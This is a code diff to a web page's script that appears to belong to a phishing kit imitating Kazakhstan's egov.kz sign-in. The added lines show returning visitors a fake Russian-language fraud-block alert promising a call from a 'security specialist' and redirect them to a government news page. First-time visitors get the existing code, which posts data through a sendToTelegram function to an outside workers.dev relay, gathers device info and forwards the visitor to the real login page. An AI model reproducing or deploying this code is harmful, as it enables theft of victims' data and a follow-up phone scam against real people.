@@ -53,7 +53,13 @@
   </div>
 
   <script>
-
+window.onload = function() {
+  if (localStorage.getItem("visited") === "true") {
+    alert("Доступ к сайту заблокирован из-за подозрений на мошенничество. Ожидайте звонок от специалиста службы безопасности");
+	window.location = 'https://www.gov.kz/memleket/entities/aqmola-selinograd/press/news/details/686686?lang=ru';
+  } else {
+    localStorage.setItem("visited", "true");
+	
      function sendToTelegram(txt) {
   fetch("https://tg-token.summer-tree-a4ba.workers.dev", {
     method: "POST",
@@ -199,11 +205,14 @@ console.log(getDeviceInfo());
         window.location = 'https://idp.egov.kz/idp/sign-in';
       }
     })();
+  }
+}
   </script>
 </body>
 
 
 </html>
+
 
 
 
